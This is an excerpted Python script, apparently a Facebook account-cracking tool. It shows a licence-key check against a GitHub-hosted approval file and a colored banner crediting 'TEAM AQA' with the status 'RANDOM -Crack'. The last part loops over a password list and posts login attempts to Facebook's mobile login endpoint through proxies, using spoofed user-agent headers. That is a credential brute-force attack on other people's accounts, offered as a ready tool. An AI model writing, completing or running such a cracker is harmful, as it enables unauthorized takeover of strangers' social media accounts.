...
try:
    ...
    prox = requests.get('https://github.com/Nil500/AApproval.txt/blob/main/AApproval.txt').text
...
def uaku():
    try:
        ...
        a = requests.get('https://github.com/Nil500/AApproval.txt/blob/main/AApproval.txt').text
        ua = open('.Hello Azim Khan, Please Confrom My Key To Premium :-) Key : MR-ALEX-X10623TC085110Y==')
...
os.system("xdg-open https://github.com/Nil500/AApproval.txt/blob/main/AApproval.txt")
...
██    ██      ██ ██   ██ ██  ██  ██ ██   ██
  ████   ███████ ██   ██ ██      ██ ██   ██  
\033[1;32m[+]==*==*==*==*==*==*==*==*==*==*==*==*===*=*=*==
\033[1;32m[+] \033[1;33mCREATED-MAn  :  \033[1;33mOSᗩᗰᗩ-ZᗩᗰZᗩᗰ 
\033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mLIBYA-1982
\033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35mAQA
\033[1;32m[+] \033[1;36mTOOL STATUS  :  \033[1;36mRANDOM -Crack 
\033[1;32m[+] \033[1;36mTOOL VIRSION :  \033[1;36m2.9.2
\033[1;32m[+]==*==*==*==*==*==*==*==*==*==*==*==**==*==*== *=
            \033[1;31m• \033[1;33m• \033[1;34m• \033[1;36mTEAM AQA \033[1;31m• \033[1;33m• \033[1;34m• """
BLUE = '\033[1;32m'
    ...
    try:
        for ps in pwx:
            ...
            header_freefb = {'authority': 'm.facebook.com',
                             ...
                             'user-agent': ua}
            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc', data=log_data,
                              headers=header_freefb, proxies=proxs).text
